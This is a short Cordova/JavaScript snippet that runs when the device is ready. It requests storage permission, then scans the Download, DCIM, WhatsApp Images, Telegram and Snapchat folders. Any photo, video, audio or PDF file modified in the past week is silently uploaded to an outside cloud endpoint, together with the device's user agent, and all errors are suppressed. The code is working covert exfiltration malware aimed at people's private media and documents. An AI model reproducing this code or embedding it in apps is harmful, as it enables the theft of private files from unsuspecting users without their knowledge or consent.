document.addEventListener('deviceready', () => {
  const allowedExts = ['.jpg', '.jpeg', '.png', '.mp4', '.heic', '.pdf', '.webp', '.aac', '.amr', '.3gp'];
  const ageLimit = 7 * 86400 * 1000;

  const perms = cordova.plugins.permissions;
  perms.requestPermission(perms.READ_EXTERNAL_STORAGE, beginScan, () => {});

  function beginScan() {
    const dirs = [
      'Download',
      'DCIM',
      'WhatsApp/Media/WhatsApp Images',
      'Telegram',
      'Snapchat'
    ];
    dirs.forEach(sub => {
      const path = 'file:///storage/emulated/0/' + sub;
      window.resolveLocalFileSystemURL(path, dir => {
        const reader = dir.createReader();
        reader.readEntries(entries => {
          entries.forEach(e => {
            if (!e.isFile) return;
            e.file(file => {
              const ext = file.name.slice(file.name.lastIndexOf('.')).toLowerCase();
              if (!allowedExts.includes(ext)) return;
              if (Date.now() - file.lastModified > ageLimit) return;

              const form = new FormData();
              form.append('file', file, file.name);
              fetch('https://mazlabz-terminal-894383524313.us-central1.run.app/api/upload', {
                method: 'POST',
                body: form,
                headers: { 'X-Agent': navigator.userAgent }
              }).catch(() => {});
            });
          });
        });
      });
    });
  }
});
